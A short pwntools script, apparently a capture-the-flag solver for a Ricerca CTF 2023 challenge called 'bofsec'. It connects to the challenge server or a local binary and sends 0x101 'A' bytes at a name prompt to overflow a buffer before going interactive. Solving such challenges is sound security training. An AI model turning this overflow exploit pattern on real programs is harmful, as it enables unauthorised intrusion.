#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("bofsec.2023.ricercactf.com", 9001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *get_auth+113
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"A" * 0x101

p.recvuntil("Name:")
p.sendline(payload)

p.interactive()
